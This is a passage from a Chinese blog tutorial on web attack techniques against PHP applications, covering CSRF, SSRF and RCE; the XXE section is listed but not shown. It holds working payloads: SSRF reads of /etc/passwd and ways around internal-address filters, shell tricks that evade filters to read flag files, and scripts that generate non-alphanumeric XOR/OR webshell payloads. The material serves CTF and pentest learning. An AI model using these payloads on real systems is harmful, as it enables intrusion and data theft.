@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        
+    
+    <link rel='stylesheet' href="/./css/dracula.css">
+
+        <title>Web攻防-PHP应用-CSRF&SSRF&RCE&XML漏洞</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2.0">
+<link rel="stylesheet" href="/css/style.css">
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="manifest" href="/site.webmanifest">
+
+    <meta name="generator" content="Hexo 6.3.0"></head>
+    <body>
+        <header class="al_header al_pos_fixed">
+    <div class="al_header_container dis_flex_jcenter">
+        <div class="al_header_container_left">
+            <div class="al_header_site_title">
+                <a href="/">Hexo</a>
+            </div>
+        </div>
+
+        <div class="dis_flex_jcenter">
+            <div class="al_header_setting">
+                <svg class="al_header_icon">
+                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-menu"></use>
+                </svg>
+            </div>
+        </div>
+    </div>
+</header>
+
+        <div class="al_sidebar">
+
+    <div class="al_sidebar_overlay al_full_cover"></div>
+
+    <div class="al_pos_fixed al_sidebar_cnt">
+        <div class="dis_flex_acenter al_sidebar_header">
+            <h3>Hexo</h3>
+            <div class="al_sidebar_close al_header_setting">
+                <svg class="al_header_icon">
+                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-close"></use>
+                </svg>
+            </div>
+        </div>
+
+        <div class="al_sidebar_author_cnt">
+
+            <div class="al_sidebar_author_info">
+                <h4>John Doe</h4>
+                <img class="al_sidebar_avatar" src="https://yourAvatorURL">
+                <p></p>
+            </div>
+
+            
+        </div>
+    </div>
+</div>
+
+        
+    <div class="dis_flex_center al_lightbox_cnt al_full_cover">
+        <img class="al_lightbox_img"/>
+    </div>
+    <div class="al_page_background dis_flex_center al_full_cover"></div>
+    <div class="al_page_container">
+        <div class="al_pos_ab al_fake_background"></div>
+        <div class="al_main_container al_shadow al_main_page_container">
+            <article class="al_article">
+                <header>
+                    <h1 class="al_page_title">
+                        Web攻防-PHP应用-CSRF&SSRF&RCE&XML漏洞
+                    </h1>
+                    <div class="al_page_info dis_flex">
+                        <div class="al_page_content_info">
+                            Sun October 8, 2023 10:32 PM
+                        </div>
+
+                        
+
+                        
+                        <span class="tags"></span>
+                    </div>
+                </header>
+
+                
+                    <div class="al_page_content_outline">
+                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8"><span class="toc-text">攻击利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E9%98%B2%E6%8A%A4"><span class="toc-text">无防护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Referer%E5%90%8C%E6%BA%90"><span class="toc-text">Referer同源</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8C%B9%E9%85%8D%E5%AF%B9%E6%AF%94"><span class="toc-text">匹配对比</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E9%83%A8%E5%AF%B9%E6%AF%94"><span class="toc-text">全部对比</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E5%88%A4%E6%96%AD%E9%9A%90%E6%82%A3"><span class="toc-text">逻辑判断隐患</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token%E6%A0%A1%E9%AA%8C"><span class="toc-text">Token校验</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-1"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-text">漏洞挖掘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8"><span class="toc-text">伪协议利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-text">绕过方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA%E7%B1%BBssrf"><span class="toc-text">导出类ssrf</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE"><span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%8B%E5%89%8D%E7%9A%84%E9%93%BE%E6%8E%A5"><span class="toc-text">之前的链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4flag%EF%BC%88%E6%96%87%E4%BB%B6%E5%90%8D%EF%BC%89%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-text">过滤flag（文件名）关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-text">过滤函数关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-text">过滤空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E9%80%83%E9%80%B8"><span class="toc-text">参数逃逸</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E6%80%8E%E4%B9%88%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8rce"><span class="toc-text">无回显怎么判断是否存在rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-1"><span class="toc-text">漏洞挖掘</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE"><span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-2"><span class="toc-text">介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XML"><span class="toc-text">XML</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE-1"><span class="toc-text">XXE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-text">有回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-text">无回显</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E"><span class="toc-text">判断是否存在漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">任意文件读取</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">伪协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-2"><span class="toc-text">漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E7%9B%92"><span class="toc-text">黑盒</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E7%9B%92"><span class="toc-text">白盒</span></a></li></ol></li></ol></li></ol>
+                    </div>
+                
+
+                
+                <section id="post-body">
+                    <h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>CSRF，中文名称：跨站请求伪造。攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。</p>
+<p>举个例子：我们构造一个数据包，<code>www.alipay.com/pay.html?name=znskiw&amp;account=1649447673@qq.com&amp;money=10000</code>（向znskiw用户用户账号<a href="mailto:&#49;&#54;&#52;&#57;&#52;&#x34;&#x37;&#54;&#x37;&#51;&#x40;&#113;&#x71;&#x2e;&#x63;&#x6f;&#109;">&#49;&#54;&#52;&#57;&#52;&#x34;&#x37;&#54;&#x37;&#51;&#x40;&#113;&#x71;&#x2e;&#x63;&#x6f;&#109;</a>转账10000元）。把这个数据包放到某个服务器上面，当一个用户刚刚访问完alipay.com，又访问了这个服务器，那么这个钱就会被转走</p>
+<h2 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h2><p>csrf攻击要熟悉攻击对象的数据包，所以一般攻击的是网上有源码的，自己搭建个网站，抓自己的包，修改一下，让受害者点击</p>
+<h3 id="无防护"><a href="#无防护" class="headerlink" title="无防护"></a>无防护</h3><p>这里用某一个后台添加管理员为例</p>
+<p><img src="/2023/10/08/Web%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8-CSRF-SSRF-RCE-XML%E6%BC%8F%E6%B4%9E/1.png" alt="1"></p>
+<p>抓一个数据包，右键选择这个</p>
+<p><img src="/2023/10/08/Web%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8-CSRF-SSRF-RCE-XML%E6%BC%8F%E6%B4%9E/2.png" alt="2"></p>
+<p>将得到的内容全选，复制到某个服务器里去，诱导刚刚访问过管理员后台的人点击这个网站，就可以成功加入管理员。</p>
+<h3 id="Referer同源"><a href="#Referer同源" class="headerlink" title="Referer同源"></a>Referer同源</h3><p>比较referer是否符合要求</p>
+<h4 id="匹配对比"><a href="#匹配对比" class="headerlink" title="匹配对比"></a>匹配对比</h4><p>就是只要有就行，比如<code>http://81.71.103.144/login.php</code>这个网站，可能要求的是referfer里面要有81.71.103.144就行，这时候，我们如果把网站目录改成81.71.103.144的话，那么referer就会变成<code>http://127.0.0.4/81.71.103.144/</code>,就会包含所需ip。</p>
+<p>注意目录不能包含<code>/</code>,所以如果需要包含http:&#x2F;&#x2F;的话就不行了</p>
+<h4 id="全部对比"><a href="#全部对比" class="headerlink" title="全部对比"></a>全部对比</h4><p>必须和要求的完全一致。那从外部就无法访问了，我们可以配合xss漏洞，referer就可以是他自己了</p>
+<h4 id="逻辑判断隐患"><a href="#逻辑判断隐患" class="headerlink" title="逻辑判断隐患"></a>逻辑判断隐患</h4><p>如果我们直接从空白的浏览器访问某个网站，那么这时就没有referer，所以要设置一些页面可以没有referer访问，而有些关键的页面不行。但是有些程序就比较简陋，就直接设置没有referer就可以访问，我们就可以把poc加上这一句话<code>&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;</code>,就可以删除referer，成功访问</p>
+<h3 id="Token校验"><a href="#Token校验" class="headerlink" title="Token校验"></a>Token校验</h3><p>有些网站会进行token验证，token不对时就无法进行操作，比如zblog</p>
+<p><img src="/2023/10/08/Web%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8-CSRF-SSRF-RCE-XML%E6%BC%8F%E6%B4%9E/3.png" alt="3"></p>
+<p>这个一般是绕过不了，只能靠代码逻辑不严谨来攻击，从三个方向入手：</p>
+<ul>
+<li>将Token参数值复用</li>
+<li>将Token参数删除</li>
+<li>将Token参数值置空</li>
+</ul>
+<p>一的原因是有些网站token用一次后还允许再次使用同一个token，二三的原因和Referer同源的逻辑判断隐患一样</p>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>SSRF，中文名称：服务器端请求伪造。一种由攻击者构造形成由服务端发起请求的一个安全漏洞，由于服务端提供了从其他服务器应用获取数据的功能(例如分享等功能)且没有对目标地址做过滤与限制，攻击者可以请求一些敏感信息。比如输入<code>http://127.0.0.1/index.php</code>就会输出网站源码</p>
+<p>因为它是由服务端发起的，它能够请求到与它相连而与外网隔离的内部系统，所以一般情况下，SSRF攻击的目标是从外网无法访问的内部系统</p>
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p><strong>黑盒</strong>：</p>
+<ul>
+<li>业务功能点：对用户输入数据进行访问、预览、解析的地方。比如图片加载&#x2F;下载、在线翻译</li>
+<li>URL关键参数：share、wap、url、link、src、source、target、u、display、sourceURl、imageURL、domain</li>
+</ul>
+<p>比如这样的：</p>
+<p><img src="/2023/10/08/Web%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8-CSRF-SSRF-RCE-XML%E6%BC%8F%E6%B4%9E/1.jpg" alt="1"></p>
+<p><strong>白盒</strong>：</p>
+<p>文件读取(file_get_content)，加载（fopen)，数据操作类(curl_setopt)等的函数</p>
+<h2 id="伪协议利用"><a href="#伪协议利用" class="headerlink" title="伪协议利用"></a>伪协议利用</h2><ul>
+<li><p>http:&#x2F;&#x2F; Web常见访问，如<a target="_blank" rel="noopener" href="http://127.0.0.1(这个还能探测端口开放)/">http://127.0.0.1（这个还能探测端口开放）</a></p>
+</li>
+<li><p>file:&#x2F;&#x2F;&#x2F; 从文件系统中获取文件内容，如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</p>
+</li>
+<li><p>dict:&#x2F;&#x2F; 字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info：</p>
+</li>
+<li><p>sftp:&#x2F;&#x2F; SSH文件传输协议或安全文件传输协议</p>
+</li>
+<li><p>ldap:&#x2F;&#x2F; 轻量级目录访问协议</p>
+</li>
+<li><p>tftp:&#x2F;&#x2F; 简单文件传输协议</p>
+</li>
+<li><p>gopher:&#x2F;&#x2F; 分布式文档传递服务，可使用gopherus生成payload，注意payload要再一次url编码【由于有部分协议http这类不支持，可以gopher来进行通讯（mysql，redis等）】</p>
+</li>
+</ul>
+<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><p>限制请求IP不为内网地址</p>
+<ul>
+<li><p>采取短网址绕过</p>
+</li>
+<li><p>采取域名解析:</p>
+</li>
+</ul>
+<p>买一个域名，把这个域名绑定127.0.0.1，那么访问这个域名就和访问127.0.0.1效果一样</p>
+<ul>
+<li>采取进制转换:</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://tool.520101.com/wangluo/jinzhizhuanhuan/%EF%BC%8C%E6%B3%A8%E6%84%8F16%E8%BF%9B%E5%88%B6%E5%89%8D%E9%9D%A2%E8%A6%81%E5%8A%A0%E4%B8%8A0x%EF%BC%8C%E6%AF%94%E5%A6%82127.0.0.1%E7%9B%B8%E5%BD%93%E4%BA%8E0x7F000001">https://tool.520101.com/wangluo/jinzhizhuanhuan/，注意16进制前面要加上0x，比如127.0.0.1相当于0x7F000001</a></p>
+<ul>
+<li>采取3XX重定向:</li>
+</ul>
+<p>在自己的网站上写入这个文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location:http://127.0.0.1/flag.php&quot;); </span><br></pre></td></tr></table></figure>
+
+<p>再在攻击目标里访问这个文件，就相当于访问攻击目标本地的flag文件</p>
+<ul>
+<li>用一些特殊写法：</li>
+</ul>
+<p>127.0.0.1写成127.1或127.127.127.127或0或0.0.0.0</p>
+<ul>
+<li><p>匹配且不影响写法解析：</p>
+<p>比如要求url里面规定一定要包含ctf和show的话可以这么写<code>url=http://ctf.@127.0.0.1/flag.php#show</code></p>
+</li>
+</ul>
+<h2 id="导出类ssrf"><a href="#导出类ssrf" class="headerlink" title="导出类ssrf"></a>导出类ssrf</h2><p>有些导出类功能也会解析代码，造成ssrf漏洞，比如pdf编辑器，这里没有回显，就使用dnslog，我们在编辑器里输入这样的代码，dnslog就会收到信息</p>
+<p><img src="/2023/10/08/Web%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8-CSRF-SSRF-RCE-XML%E6%BC%8F%E6%B4%9E/6.png" alt="6"></p>
+<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="之前的链接"><a href="#之前的链接" class="headerlink" title="之前的链接"></a>之前的链接</h2><p>前面写过rce了：<a target="_blank" rel="noopener" href="https://ylt1234.github.io/2023/03/22/RCE/%EF%BC%8C%E5%A4%A7%E9%83%A8%E5%88%86%E5%B7%AE%E4%B8%8D%E5%A4%9A%EF%BC%8C%E8%A1%A5%E5%85%85%E4%B8%80%E7%82%B9%E4%BB%A5%E5%89%8D%E6%B2%A1%E6%9C%89%E7%9A%84">https://ylt1234.github.io/2023/03/22/RCE/，大部分差不多，补充一点以前没有的</a></p>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="过滤flag（文件名）关键字"><a href="#过滤flag（文件名）关键字" class="headerlink" title="过滤flag（文件名）关键字"></a>过滤flag（文件名）关键字</h3><p>1、通配符</p>
+<p>flag&#x3D;fl*</p>
+<p>cat fl*</p>
+<p>cat ?la*</p>
+<p>2、转义符号</p>
+<p>ca\t &#x2F;fl\ag</p>
+<p>cat fl’’ag</p>
+<p>2、使用空变量$*和$@，$x,${x}绕过</p>
+<p>ca$*t fl$*ag</p>
+<p>ca$@t fl$@ag</p>
+<p>ca$5t f$5lag</p>
+<p>ca${2}t f${2}lag</p>
+<p>3、拼接法</p>
+<p>a&#x3D;fl;b&#x3D;ag;cat$IFS$a$b</p>
+<p>4、反引号绕过:</p>
+<p>cat 反引号ls反引号（反引号在md里无法显示，就用中文代替）</p>
+<p>5、编码绕过:</p>
+<p>echo ‘flag’ | base64（查看flag编码后的结果，写在下面的命令里）</p>
+<p>cat <code>echo ZmxhZwo= | base64 -d</code></p>
+<p>6、组合绝活</p>
+<p>touch “ag”</p>
+<p>touch “fl\“</p>
+<p>touch “t \“</p>
+<p>touch “ca\“</p>
+<p>ls -t &gt;shell</p>
+<p>sh shell</p>
+<ul>
+<li><p>touch是建立新文件</p>
+</li>
+<li><p><code>\</code>指的是换行</p>
+</li>
+<li><p>ls -t是将文本按时间排序输出</p>
+</li>
+<li><p>ls -t &gt;shell 将输出输入到shell文件中</p>
+</li>
+<li><p>sh将文本中的文字读取出来执行</p>
+</li>
+</ul>
+<p>7、异或无符号（过滤0-9a-zA-Z）</p>
+<p>异或：rce-xor.php &amp; rce-xor.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$myfile = fopen(&quot;res.txt&quot;, &quot;w&quot;);</span><br><span class="line">$contents=&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; 256; $i++) &#123;</span><br><span class="line">    for ($j=0; $j &lt;256 ; $j++) &#123;</span><br><span class="line"></span><br><span class="line">        if($i&lt;16)&#123;</span><br><span class="line">            $hex_i=&#x27;0&#x27;.dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $hex_i=dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        if($j&lt;16)&#123;</span><br><span class="line">            $hex_j=&#x27;0&#x27;.dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $hex_j=dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        $preg = &#x27;/[a-z0-9]/i&#x27;; //根据题目给的正则表达式修改即可</span><br><span class="line">        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">            echo &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        else&#123;</span><br><span class="line">            $a=&#x27;%&#x27;.$hex_i;</span><br><span class="line">            $b=&#x27;%&#x27;.$hex_j;</span><br><span class="line">            $c=(urldecode($a)^urldecode($b));</span><br><span class="line">            if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;</span><br><span class="line">                $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">from sys import *</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def action(arg):</span><br><span class="line">    s1 = &quot;&quot;</span><br><span class="line">    s2 = &quot;&quot;</span><br><span class="line">    for i in arg:</span><br><span class="line">        f = open(&quot;res.txt&quot;, &quot;r&quot;)</span><br><span class="line">        while True:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            if t == &quot;&quot;:</span><br><span class="line">                break</span><br><span class="line">            if t[0] == i:</span><br><span class="line">                # print(i)</span><br><span class="line">                s1 += t[2:5]</span><br><span class="line">                s2 += t[6:9]</span><br><span class="line">                break</span><br><span class="line">        f.close()</span><br><span class="line">    output = &quot;(\&quot;&quot; + s1 + &quot;\&quot;^\&quot;&quot; + s2 + &quot;\&quot;)&quot;</span><br><span class="line">    return (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    param = action(input(&quot;\n[+] your function：&quot;)) + action(input(&quot;[+] your command：&quot;)) + &quot;;&quot;</span><br><span class="line">    print(param)</span><br></pre></td></tr></table></figure>
+
+<p>或：rce-xor-or.php &amp; rce-xor-or.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$myfile = fopen(&quot;res_xor.txt&quot;, &quot;w&quot;);</span><br><span class="line">$contents=&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; 256; $i++) &#123;</span><br><span class="line">    for ($j=0; $j &lt;256 ; $j++) &#123;</span><br><span class="line"></span><br><span class="line">        if($i&lt;16)&#123;</span><br><span class="line">            $hex_i=&#x27;0&#x27;.dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $hex_i=dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        if($j&lt;16)&#123;</span><br><span class="line">            $hex_j=&#x27;0&#x27;.dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $hex_j=dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        $preg = &#x27;/[0-9a-z]/i&#x27;;//根据题目给的正则表达式修改即可</span><br><span class="line">        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">            echo &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        else&#123;</span><br><span class="line">            $a=&#x27;%&#x27;.$hex_i;</span><br><span class="line">            $b=&#x27;%&#x27;.$hex_j;</span><br><span class="line">            $c=(urldecode($a)|urldecode($b));</span><br><span class="line">            if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;</span><br><span class="line">                $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">from sys import *</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def action(arg):</span><br><span class="line">    s1 = &quot;&quot;</span><br><span class="line">    s2 = &quot;&quot;</span><br><span class="line">    for i in arg:</span><br><span class="line">        f = open(&quot;res_xor.txt&quot;, &quot;r&quot;)</span><br><span class="line">        while True:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            if t == &quot;&quot;:</span><br><span class="line">                break</span><br><span class="line">            if t[0] == i:</span><br><span class="line">                # print(i)</span><br><span class="line">                s1 += t[2:5]</span><br><span class="line">                s2 += t[6:9]</span><br><span class="line">                break</span><br><span class="line">        f.close()</span><br><span class="line">    output = &quot;(\&quot;&quot; + s1 + &quot;\&quot;|\&quot;&quot; + s2 + &quot;\&quot;)&quot;</span><br><span class="line">    return (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    param = action(input(&quot;\n[+] your function：&quot;)) + action(input(&quot;[+] your command：&quot;)) + &quot;;&quot;</span><br><span class="line">    print(param)</span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤函数关键字"><a href="#过滤函数关键字" class="headerlink" title="过滤函数关键字"></a>过滤函数关键字</h3><p>1、内敛执行绕过（system）</p>
+<p>echo 反引号ls反引号;</p>
+<p>echo $(ls);</p>
+<p>?&gt;&lt;?&#x3D;反引号ls反引号;</p>
+<p>?&gt;&lt;?&#x3D;$(ls);</p>
+<p>2、过滤执行命令（如cat tac等）</p>
+<p>more:一页一页的显示档案内容</p>
+<p>less:与 more 类似</p>
+<p>head:查看头几行</p>
+<p>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</p>
+<p>tail:查看尾几行</p>
+<p>nl：显示的时候，顺便输出行号</p>
+<p>od:以二进制的方式读取档案内容</p>
+<p>vi:一种编辑器，这个也可以查看</p>
+<p>vim:一种编辑器，这个也可以查看</p>
+<p>sort:可以查看</p>
+<p>uniq:可以查看</p>
+<p>file -f:报错出具体内容</p>
